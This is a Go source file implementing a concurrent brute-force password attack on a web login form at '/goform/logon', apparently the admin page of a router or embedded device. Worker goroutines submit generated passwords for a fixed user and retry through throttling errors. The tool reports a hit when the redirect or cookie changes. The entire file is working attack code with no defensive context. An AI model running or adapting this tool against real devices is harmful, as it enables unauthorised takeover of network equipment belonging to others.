package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type bruteForce struct {
	hostPort string
	user     string

	numWorkers int

	seq *sequence
}

func newBruteForce(hostPort, user string, numWorkers int, seq *sequence) *bruteForce {
	return &bruteForce{
		hostPort:   hostPort,
		user:       user,
		numWorkers: numWorkers,
		seq:        seq,
	}
}

func (bf *bruteForce) Do() {
	passwords := make(chan string, 1024)

	go func() {
		for {
			passwords <- bf.seq.next()
		}
	}()

	var wg sync.WaitGroup
	wg.Add(bf.numWorkers)
	for i := 0; i < bf.numWorkers; i++ {
		go func() {
			httpClient := &http.Client{
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
				Transport: &http.Transport{
					ResponseHeaderTimeout: time.Second,
				},
				Timeout: time.Second,
			}

			for {
				bf.checkPassword(httpClient, <-passwords)
			}

			wg.Done()
		}()
	}

	wg.Wait()
}

func (bf *bruteForce) checkPassword(client *http.Client, password string) {
	log.Printf("Check password: %s", password)

	form := url.Values{}
	form.Add("username_login", bf.user)
	form.Add("password_login", password)
	form.Add("language_selector", "po")

	var resp *http.Response
	for {
		req, err := http.NewRequest("POST", "http://"+bf.hostPort+"/goform/logon",
			strings.NewReader(form.Encode()))
		if err != nil {
			log.Fatalf("password '%s', error: %v", password, err)
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Connection", "close")

		resp, err = client.Do(req)
		if isRetriableError(err) {
			time.Sleep(3 * time.Second)
			continue
		}
		if err != nil {
			log.Fatalf("password '%s', error: %v", password, err)
		}
		break
	}
	defer resp.Body.Close()

	if resp.Header.Get("Location") != "/logon.html" {
		log.Printf("PASSWORD: %s, Location: %s", password, resp.Header.Get("Location"))

		os.Exit(0)
	} else if resp.Header.Get("Set-cookie") != "" {
		log.Printf("PASSWORD: %s, Set-cookie: %s", password, resp.Header.Get("Set-cookie"))

		os.Exit(0)
	}
}

func isRetriableError(err error) bool {
	if err != nil &&
		(strings.Contains(err.Error(), "connection reset by peer") ||
			strings.Contains(err.Error(), "timeout awaiting response headers") ||
			strings.Contains(err.Error(), "with Body length 0") ||
			strings.Contains(err.Error(), "exceeded while awaiting headers")) {
		fmt.Print(".")
		return true
	}
	return false
}
